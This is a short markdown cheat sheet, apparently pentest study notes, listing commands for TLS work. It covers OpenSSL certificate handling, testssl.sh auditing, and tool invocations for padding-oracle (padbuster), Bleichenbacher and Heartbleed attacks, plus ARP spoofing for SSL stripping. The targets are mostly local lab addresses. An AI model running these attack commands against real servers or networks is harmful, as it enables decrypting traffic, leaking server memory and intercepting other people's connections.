#web #tls #ssl #openssl #crypto

# HTTPS / TLS Attacks

Related: [http-attacks](http-attacks.md) · [traffic-analysis](../Network/traffic-analysis.md)

## OpenSSL
```bash
openssl s_client -connect hackthebox.com:443 | openssl x509 > hackthebox.pem
```
Download a server's certificate.

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out selfsigned.pem -sha256 -days 365
```
Create a self-signed certificate.

```bash
openssl rsautl -decrypt -inkey rsa.pem -in msg.enc > decrypted.txt
```
Decrypt a file with an RSA private key (`-encrypt` + `-pubin` to encrypt).

## Test TLS Config
```bash
bash testssl.sh https://hackthebox.com
```
Audit a server's TLS configuration (protocols, ciphers, PFS).

## Padding Oracle (POODLE / CBC)
```bash
padbuster http://127.0.0.1:4000/admin "AAAA...1z0=" 16 -encoding 0 -cookies "user=AAAA...1z0="
```
Decrypt/forge ciphertext via a padding oracle (block size 16).

## Bleichenbacher (RSA PKCS#1 v1.5)
```bash
java -jar bleichenbacher-1.0.0.jar -executeAttack -connect 127.0.0.1:443 -encrypted_premaster_secret <SNIP>
```
Run the Bleichenbacher attack against a vulnerable server.

```bash
echo -n 214[...]3a8 | awk -F '0303' '{print "0303"$2}'
```
Extract the unpadded premaster secret.

## Heartbleed (CVE-2014-0160)
```bash
java -jar heartbleed-1.0.0.jar -connect 127.0.0.1:443 -executeAttack -heartbeats 10
```
Leak server memory via the Heartbleed bug.

## SSL Stripping
```bash
sudo arpspoof -i docker0 172.17.0.5
```
ARP-spoof to MITM, then strip HTTPS (defeated by HSTS). See [traffic-analysis](../Network/traffic-analysis.md).
